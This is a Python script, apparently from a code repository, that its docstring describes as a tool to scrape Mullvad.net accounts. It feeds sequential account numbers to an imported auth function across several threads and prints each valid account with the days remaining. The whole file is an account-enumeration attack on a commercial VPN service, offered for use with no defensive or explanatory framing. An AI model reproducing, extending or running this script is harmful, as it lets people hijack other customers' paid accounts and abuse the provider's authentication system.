import requests, time, os, sys
from Queue import Queue
from authModule import auth
import threading
import click

queue = Queue()
print_lock = threading.Lock()
CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

@click.command(context_settings=CONTEXT_SETTINGS)
@click.option('-t', '--threads', default=1, help='Number of threads.')
@click.option('-a', '--accounts', default=5, help='Number of accounts.')
@click.option('-s', '--start', help='Number to start from.', default=0)
def main(accounts, threads, start):
	"""This is a simple python script to scrape Mullvad.net accounts.

	Use with caution, this software is released as as under the WTFPL.
	"""
	starttime = time.time()
	for x in range(accounts):
		queue.put(start+x)

	for i in range(threads):
		worker = threading.Thread(target=Worker, args=(queue,))
		worker.setDaemon(True)
		worker.start()

	queue.join()
	click.secho('Finished in %ss' % round((time.time()-starttime), 2), fg='yellow')

def DoWork(account):
	authresponse = auth(account)
	if authresponse:
		with print_lock:
			click.secho('Account %s has %s days left.' % (account, authresponse.split()[5]), fg='green')

def Worker(q):
	while True:
		account = q.get()
		DoWork(account)
		q.task_done()

if __name__ == '__main__':
	main()